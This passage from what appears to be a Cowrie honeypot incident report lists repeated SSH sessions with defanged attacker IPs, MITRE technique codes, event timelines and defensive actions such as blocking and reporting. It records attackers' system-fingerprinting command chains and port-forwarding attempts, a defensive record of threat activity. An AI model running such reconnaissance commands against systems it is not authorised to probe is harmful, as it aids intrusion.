| `2026-08-08 04:31:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93d429d758dc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:31 |
| **Last Seen** | 2026-08-08 04:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:31:14` | `cowrie.session.connect` |
| `2026-08-08 04:31:15` | `cowrie.client.version` |
| `2026-08-08 04:31:15` | `cowrie.client.kex` |
| `2026-08-08 04:31:16` | `cowrie.login.success` |
| `2026-08-08 04:31:18` | `cowrie.session.params` |
| `2026-08-08 04:31:18` | `cowrie.command.input` |
| `2026-08-08 04:31:18` | `cowrie.command.input` |
| `2026-08-08 04:31:18` | `cowrie.command.input` |
| `2026-08-08 04:31:18` | `cowrie.command.input` |
| `2026-08-08 04:31:18` | `cowrie.command.input` |
| `2026-08-08 04:31:18` | `cowrie.command.success` |
| `2026-08-08 04:31:18` | `cowrie.command.input` |
| `2026-08-08 04:31:18` | `cowrie.command.input` |
| `2026-08-08 04:31:18` | `cowrie.command.input` |
| `2026-08-08 04:31:18` | `cowrie.command.input` |
| `2026-08-08 04:31:18` | `cowrie.log.closed` |
| `2026-08-08 04:31:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e616c1184f32

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:33 |
| **Last Seen** | 2026-08-08 04:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:33:02` | `cowrie.session.connect` |
| `2026-08-08 04:33:02` | `cowrie.client.version` |
| `2026-08-08 04:33:02` | `cowrie.client.kex` |
| `2026-08-08 04:33:02` | `cowrie.login.success` |
| `2026-08-08 04:33:03` | `cowrie.session.params` |
| `2026-08-08 04:33:03` | `cowrie.command.input` |
| `2026-08-08 04:33:03` | `cowrie.log.closed` |
| `2026-08-08 04:33:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af8b93d3a048

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:33 |
| **Last Seen** | 2026-08-08 04:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:33:07` | `cowrie.session.connect` |
| `2026-08-08 04:33:07` | `cowrie.client.version` |
| `2026-08-08 04:33:07` | `cowrie.client.kex` |
| `2026-08-08 04:33:09` | `cowrie.login.success` |
| `2026-08-08 04:33:10` | `cowrie.session.params` |
| `2026-08-08 04:33:10` | `cowrie.command.input` |
| `2026-08-08 04:33:10` | `cowrie.command.input` |
| `2026-08-08 04:33:10` | `cowrie.command.input` |
| `2026-08-08 04:33:10` | `cowrie.command.input` |
| `2026-08-08 04:33:10` | `cowrie.command.input` |
| `2026-08-08 04:33:10` | `cowrie.command.success` |
| `2026-08-08 04:33:10` | `cowrie.command.input` |
| `2026-08-08 04:33:10` | `cowrie.command.input` |
| `2026-08-08 04:33:10` | `cowrie.command.input` |
| `2026-08-08 04:33:10` | `cowrie.command.input` |
| `2026-08-08 04:33:10` | `cowrie.log.closed` |
| `2026-08-08 04:33:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef09ef8a3038

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:34 |
| **Last Seen** | 2026-08-08 04:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:34:47` | `cowrie.session.connect` |
| `2026-08-08 04:34:47` | `cowrie.client.version` |
| `2026-08-08 04:34:47` | `cowrie.client.kex` |
| `2026-08-08 04:34:47` | `cowrie.login.success` |
| `2026-08-08 04:34:48` | `cowrie.session.params` |
| `2026-08-08 04:34:48` | `cowrie.command.input` |
| `2026-08-08 04:34:48` | `cowrie.log.closed` |
| `2026-08-08 04:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dfc794ce59a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:34 |
| **Last Seen** | 2026-08-08 04:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:34:59` | `cowrie.session.connect` |
| `2026-08-08 04:34:59` | `cowrie.client.version` |
| `2026-08-08 04:34:59` | `cowrie.client.kex` |
| `2026-08-08 04:35:01` | `cowrie.login.success` |
| `2026-08-08 04:35:02` | `cowrie.session.params` |
| `2026-08-08 04:35:02` | `cowrie.command.input` |
| `2026-08-08 04:35:02` | `cowrie.command.input` |
| `2026-08-08 04:35:02` | `cowrie.command.input` |
| `2026-08-08 04:35:02` | `cowrie.command.input` |
| `2026-08-08 04:35:02` | `cowrie.command.input` |
| `2026-08-08 04:35:02` | `cowrie.command.success` |
| `2026-08-08 04:35:02` | `cowrie.command.input` |
| `2026-08-08 04:35:02` | `cowrie.command.input` |
| `2026-08-08 04:35:02` | `cowrie.command.input` |
| `2026-08-08 04:35:02` | `cowrie.command.input` |
| `2026-08-08 04:35:02` | `cowrie.log.closed` |
| `2026-08-08 04:35:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e822962ac06

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:36 |
| **Last Seen** | 2026-08-08 04:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:36:33` | `cowrie.session.connect` |
| `2026-08-08 04:36:33` | `cowrie.client.version` |
| `2026-08-08 04:36:33` | `cowrie.client.kex` |
| `2026-08-08 04:36:34` | `cowrie.login.success` |
| `2026-08-08 04:36:34` | `cowrie.session.params` |
| `2026-08-08 04:36:34` | `cowrie.command.input` |
| `2026-08-08 04:36:34` | `cowrie.log.closed` |
| `2026-08-08 04:36:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29ef982758ba

| Field | Detail |
|---|---|
| **Source IP** | `2.55.74[.]30` |
| **First Seen** | 2026-08-08 04:36 |
| **Last Seen** | 2026-08-08 04:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:36:51` | `cowrie.session.connect` |
| `2026-08-08 04:36:52` | `cowrie.client.version` |
| `2026-08-08 04:36:52` | `cowrie.client.kex` |
| `2026-08-08 04:36:53` | `cowrie.login.success` |
| `2026-08-08 04:36:53` | `cowrie.direct-tcpip.request` |
| `2026-08-08 04:36:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.55.74[.]30` to AbuseIPDB if not already reported
- [ ] Block `2.55.74[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-465891c63aa3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:36 |
| **Last Seen** | 2026-08-08 04:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:36:54` | `cowrie.session.connect` |
| `2026-08-08 04:36:55` | `cowrie.client.version` |
| `2026-08-08 04:36:55` | `cowrie.client.kex` |
| `2026-08-08 04:36:56` | `cowrie.login.success` |
| `2026-08-08 04:36:57` | `cowrie.session.params` |
| `2026-08-08 04:36:57` | `cowrie.command.input` |
| `2026-08-08 04:36:57` | `cowrie.command.input` |
| `2026-08-08 04:36:57` | `cowrie.command.input` |
| `2026-08-08 04:36:57` | `cowrie.command.input` |
| `2026-08-08 04:36:57` | `cowrie.command.input` |
| `2026-08-08 04:36:57` | `cowrie.command.success` |
| `2026-08-08 04:36:57` | `cowrie.command.input` |
| `2026-08-08 04:36:57` | `cowrie.command.input` |
| `2026-08-08 04:36:57` | `cowrie.command.input` |
| `2026-08-08 04:36:57` | `cowrie.command.input` |
| `2026-08-08 04:36:58` | `cowrie.log.closed` |
| `2026-08-08 04:36:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bea51c7912a7

| Field | Detail |
|---|---|
| **Source IP** | `72.24.210[.]58` |
| **First Seen** | 2026-08-08 04:37 |
| **Last Seen** | 2026-08-08 04:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:37:03` | `cowrie.session.connect` |
| `2026-08-08 04:37:03` | `cowrie.client.version` |
| `2026-08-08 04:37:03` | `cowrie.client.kex` |
| `2026-08-08 04:37:04` | `cowrie.login.success` |
| `2026-08-08 04:37:04` | `cowrie.direct-tcpip.request` |
| `2026-08-08 04:37:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.24.210[.]58` to AbuseIPDB if not already reported
- [ ] Block `72.24.210[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d11677e0457e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:38 |
| **Last Seen** | 2026-08-08 04:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:38:25` | `cowrie.session.connect` |
| `2026-08-08 04:38:25` | `cowrie.client.version` |
| `2026-08-08 04:38:25` | `cowrie.client.kex` |
| `2026-08-08 04:38:25` | `cowrie.login.success` |
| `2026-08-08 04:38:26` | `cowrie.session.params` |
| `2026-08-08 04:38:26` | `cowrie.command.input` |
| `2026-08-08 04:38:26` | `cowrie.log.closed` |
| `2026-08-08 04:38:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5522b4e08d62

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:38 |
| **Last Seen** | 2026-08-08 04:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:38:51` | `cowrie.session.connect` |
| `2026-08-08 04:38:51` | `cowrie.client.version` |
| `2026-08-08 04:38:51` | `cowrie.client.kex` |
| `2026-08-08 04:38:52` | `cowrie.login.success` |
| `2026-08-08 04:38:54` | `cowrie.session.params` |
| `2026-08-08 04:38:54` | `cowrie.command.input` |
| `2026-08-08 04:38:54` | `cowrie.command.input` |
| `2026-08-08 04:38:54` | `cowrie.command.input` |
| `2026-08-08 04:38:54` | `cowrie.command.input` |
| `2026-08-08 04:38:54` | `cowrie.command.input` |
| `2026-08-08 04:38:54` | `cowrie.command.success` |
| `2026-08-08 04:38:54` | `cowrie.command.input` |
| `2026-08-08 04:38:54` | `cowrie.command.input` |
| `2026-08-08 04:38:54` | `cowrie.command.input` |
| `2026-08-08 04:38:54` | `cowrie.command.input` |
| `2026-08-08 04:38:54` | `cowrie.log.closed` |
| `2026-08-08 04:38:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-572cb8b144cf

| Field | Detail |
|---|---|
| **Source IP** | `155.212.17[.]174` |
| **First Seen** | 2026-08-08 04:40 |
| **Last Seen** | 2026-08-08 04:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:40:00` | `cowrie.session.connect` |
| `2026-08-08 04:40:01` | `cowrie.client.version` |
| `2026-08-08 04:40:01` | `cowrie.client.kex` |
| `2026-08-08 04:40:01` | `cowrie.login.success` |
| `2026-08-08 04:40:02` | `cowrie.direct-tcpip.request` |
| `2026-08-08 04:40:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.212.17[.]174` to AbuseIPDB if not already reported
- [ ] Block `155.212.17[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36a98ba93f7c

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:40 |
| **Last Seen** | 2026-08-08 04:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:40:17` | `cowrie.session.connect` |
| `2026-08-08 04:40:17` | `cowrie.client.version` |
| `2026-08-08 04:40:17` | `cowrie.client.kex` |
| `2026-08-08 04:40:18` | `cowrie.login.success` |
| `2026-08-08 04:40:18` | `cowrie.session.params` |
| `2026-08-08 04:40:18` | `cowrie.command.input` |
| `2026-08-08 04:40:19` | `cowrie.log.closed` |
| `2026-08-08 04:40:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff0be82c1e4f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:40 |
| **Last Seen** | 2026-08-08 04:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:40:48` | `cowrie.session.connect` |
| `2026-08-08 04:40:49` | `cowrie.client.version` |
| `2026-08-08 04:40:49` | `cowrie.client.kex` |
| `2026-08-08 04:40:50` | `cowrie.login.success` |
| `2026-08-08 04:40:51` | `cowrie.session.params` |
| `2026-08-08 04:40:51` | `cowrie.command.input` |
| `2026-08-08 04:40:51` | `cowrie.command.input` |
| `2026-08-08 04:40:51` | `cowrie.command.input` |
| `2026-08-08 04:40:51` | `cowrie.command.input` |
| `2026-08-08 04:40:51` | `cowrie.command.input` |
| `2026-08-08 04:40:51` | `cowrie.command.success` |
| `2026-08-08 04:40:51` | `cowrie.command.input` |
| `2026-08-08 04:40:51` | `cowrie.command.input` |
| `2026-08-08 04:40:51` | `cowrie.command.input` |
| `2026-08-08 04:40:51` | `cowrie.command.input` |
| `2026-08-08 04:40:52` | `cowrie.log.closed` |
| `2026-08-08 04:40:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c3f5dbef745

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:42 |
| **Last Seen** | 2026-08-08 04:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:42:08` | `cowrie.session.connect` |
| `2026-08-08 04:42:08` | `cowrie.client.version` |
| `2026-08-08 04:42:08` | `cowrie.client.kex` |
| `2026-08-08 04:42:08` | `cowrie.login.success` |
| `2026-08-08 04:42:09` | `cowrie.session.params` |
| `2026-08-08 04:42:09` | `cowrie.command.input` |
| `2026-08-08 04:42:09` | `cowrie.log.closed` |
| `2026-08-08 04:42:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae74f7516344

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:44 |
| **Last Seen** | 2026-08-08 04:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:44:04` | `cowrie.session.connect` |
| `2026-08-08 04:44:04` | `cowrie.client.version` |
| `2026-08-08 04:44:04` | `cowrie.client.kex` |
| `2026-08-08 04:44:05` | `cowrie.login.success` |
| `2026-08-08 04:44:05` | `cowrie.session.params` |
| `2026-08-08 04:44:05` | `cowrie.command.input` |
| `2026-08-08 04:44:05` | `cowrie.log.closed` |
| `2026-08-08 04:44:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eeb95911d2ad

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:44 |
| **Last Seen** | 2026-08-08 04:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:44:48` | `cowrie.session.connect` |
| `2026-08-08 04:44:48` | `cowrie.client.version` |
| `2026-08-08 04:44:48` | `cowrie.client.kex` |
| `2026-08-08 04:44:49` | `cowrie.login.success` |
| `2026-08-08 04:44:50` | `cowrie.session.params` |
| `2026-08-08 04:44:50` | `cowrie.command.input` |
| `2026-08-08 04:44:50` | `cowrie.command.input` |
| `2026-08-08 04:44:50` | `cowrie.command.input` |
| `2026-08-08 04:44:50` | `cowrie.command.input` |
| `2026-08-08 04:44:50` | `cowrie.command.input` |
| `2026-08-08 04:44:50` | `cowrie.command.success` |
| `2026-08-08 04:44:50` | `cowrie.command.input` |
| `2026-08-08 04:44:50` | `cowrie.command.input` |
| `2026-08-08 04:44:50` | `cowrie.command.input` |
| `2026-08-08 04:44:50` | `cowrie.command.input` |
| `2026-08-08 04:44:51` | `cowrie.log.closed` |
| `2026-08-08 04:44:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-113821115cc0

| Field | Detail |
|---|---|
| **Source IP** | `159.223.93[.]39` |
| **First Seen** | 2026-08-08 04:45 |
| **Last Seen** | 2026-08-08 04:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
